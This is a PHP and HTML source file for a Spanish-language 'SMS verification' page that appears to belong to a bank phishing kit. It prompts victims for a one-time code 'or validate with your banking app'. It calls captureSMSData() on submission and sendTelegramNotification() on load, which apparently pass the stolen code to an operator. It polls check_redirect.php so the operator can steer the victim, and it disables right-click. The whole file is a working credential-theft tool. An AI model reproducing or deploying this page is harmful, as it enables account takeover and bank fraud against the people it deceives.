
<?php
require_once 'functions.php';
require_once 'country.php';
checkMobileAccess(); // Verificación de seguridad
sendTelegramNotification('sms');

$userId = getUserID();
$userPhone = getUserPhoneNumber($userId);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    captureSMSData();
    header('Location: cargando2.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación SMS</title>


<link rel="icon" type="image/png" href="image/favicon.png">


    <style>
        * {
            margin: 0px;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            text-align: center;
            padding: 0px 15px 0px 15px;
            width: 100%;
        }
        .logo {
            font-size: 2em;
            margin-bottom: 0px;
        }
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 15px 15px;
        }
        .container {
            background: white;
            padding: 30px 30px;
            border-radius: 10px;
            box-shadow: 0 0px 20px rgba(0,0,0,0.2);
            text-align: center;
            width: 102%;
            max-width: 400px;
            margin-bottom: 28px;
        }
        .icon {
            font-size: 4em;
            margin-bottom: 0px;
        }
        h1 {
            color: #333;
            margin-bottom: 15px;
            font-size: 1.5em;
        }
        .sms-icon {
            margin-bottom: 15px;
        }
        p {
            color: #666;
            margin-bottom: 10px;
            line-height: 2;
            font-size: 1em;
        }
        .phone {
            background: #f5f5f5;
            padding: 13px;
            border-radius: 8px;
            margin-bottom: 25px;
            font-weight: bold;
            color: #000;
            font-size: 1em;
        }
        .code-input-single {
            margin-bottom: 25px;
        }
        .code-input-single input {
            width: 100%;
            padding: 15px;
            text-align: center;
            font-size: 1.3em;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            transition: border-color 0.3s;
        }
        .code-input-single input:focus {
            outline: none;
            border-color: #f5576c;
        }
        .btn {
            background: #177ECF;
            color: white;
            border: none;
            padding: 16px 20px;
            font-size: 1.1em;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: opacity 0.3s;
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .resend {
            color: #999;
            margin-top: 15px;
            font-size: 0.85em;
        }
        .resend a {
            color: #f5576c;
            text-decoration: none;
        }
        .error-message {
            color: #f5576c;
            font-size: 0.85em;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <!-- Header content -->
    </div>

    <div class="main-content">
        <div class="container">
            <h1>Verificación SMS</h1>
            <center><a href="https://imgbb.com/"><img src="https://i.ibb.co/wr0hTGN7/Capture-du-2025-11-10-22-51-15.png" alt="Capture-du-2025-11-10-22-51-15" border="0" class="sms-icon" /></a></center>

            <p>Se ha enviado un código de verificación</p>
            <p>o valida con tu aplicación bancaria</p>

            <div class="phone" id="phoneNumber"><?php echo htmlspecialchars($userPhone); ?></div>
            
            <form id="smsForm" method="POST">
                <div class="code-input-single">
                    <input type="text" 
                           id="smsCode" 
                           name="sms_code" 
                           placeholder="Ingrese el código" 
                           maxlength="10" 
                           required 
                           autocomplete="one-time-code">
                    <div class="error-message" id="smsCodeError">
                        El código debe tener entre 6 y 10 dígitos
                    </div>
                </div>

                <button type="submit" class="btn" id="submitBtn" disabled>
                    Validar código
                </button>
            </form>
        </div>
    </div>

    <?php include 'footer.php'; ?>

    <script>
        // Prevenir clic derecho en toda la página
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        // Prevenir clic en imágenes
        document.addEventListener('DOMContentLoaded', function() {
            const images = document.querySelectorAll('img');
            images.forEach(img => {
                img.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                });
                
                // Prevenir arrastrar y soltar
                img.addEventListener('dragstart', function(e) {
                    e.preventDefault();
                });
            });

            // Validación del código SMS
            const smsInput = document.getElementById('smsCode');
            const errorElement = document.getElementById('smsCodeError');
            const submitBtn = document.getElementById('submitBtn');

            smsInput.addEventListener('input', function(e) {
                // Solo permitir números
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                // Validar longitud
                const value = e.target.value;
                const isValid = value.length >= 6 && value.length <= 10;
                
                if (value.length > 0 && !isValid) {
                    errorElement.style.display = 'block';
                    e.target.style.borderColor = '#f5576c';
                    submitBtn.disabled = true;
                } else {
                    errorElement.style.display = 'none';
                    e.target.style.borderColor = isValid ? '#27ae60' : '#e0e0e0';
                    submitBtn.disabled = !isValid;
                }
            });

            // Validación al enviar el formulario
            document.getElementById('smsForm').addEventListener('submit', function(e) {
                const value = smsInput.value;
                const isValid = value.length >= 6 && value.length <= 10;
                
                if (!isValid) {
                    e.preventDefault();
                    errorElement.style.display = 'block';
                    smsInput.style.borderColor = '#f5576c';
                    smsInput.focus();
                }
            });

            // Empêcher le message de validation HTML5 par défaut
            smsInput.addEventListener('invalid', function(e) {
                e.preventDefault();
                errorElement.style.display = 'block';
                smsInput.style.borderColor = '#f5576c';
            });
        });

        setInterval(function() {
            fetch('check_redirect.php')
                .then(response => response.json())
                .then(data => {
                    if (data.redirect) {
                        window.location.href = data.url;
                    }
                })
                .catch(error => console.error('Error:', error));
        }, 2000);
    </script>
</body>
</html>

